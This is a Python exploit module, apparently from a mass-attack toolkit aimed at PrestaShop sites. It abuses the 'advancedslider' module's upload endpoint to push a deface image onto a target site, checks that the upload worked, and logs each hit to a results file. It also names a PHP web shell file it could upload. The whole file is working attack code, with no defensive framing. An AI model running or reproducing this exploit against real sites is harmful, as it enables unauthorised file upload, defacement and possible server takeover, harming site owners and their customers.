# coding=utf-8
import requests
from Exploits import printModule

r = '\033[31m'
g = '\033[32m'
y = '\033[33m'
b = '\033[34m'
m = '\033[35m'
c = '\033[36m'
w = '\033[37m'
Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
Jce_Deface_image = 'files/pwn.gif'
ShellPresta = 'files/up.php'


def Exploit(site):
    try:
        Exp = site + '/modules/advancedslider/ajax_advancedsliderUpload.php?action=submitUploadImage%26id_slide=php'
        Checkvuln = requests.get('http://' + Exp, timeout=10, headers=Headers)
        FileDataIndex = {'qqfile': open(Jce_Deface_image, 'rb')}
        if Checkvuln.status_code == 200:
            requests.post('http://' + Exp, files=FileDataIndex, timeout=10, headers=Headers)
            IndexPath = site + '/modules/advancedslider/uploads/' + Jce_Deface_image.split('/')[1]
            CheckIndex = requests.get('http://' + IndexPath, timeout=10, headers=Headers)
            if 'GIF89a' in str(CheckIndex.content):
                with open('result/Index_results.txt', 'a') as writer:
                    writer.write(IndexPath + '\n')
                return printModule.returnYes(site, 'N/A', 'advancedslider Module', 'Prestashop')
            else:
                return printModule.returnNo(site, 'N/A', 'advancedslider Module', 'Prestashop')
        else:
            return printModule.returnNo(site, 'N/A', 'advancedslider Module', 'Prestashop')
    except:
        return printModule.returnNo(site, 'N/A', 'advancedslider Module', 'Prestashop')
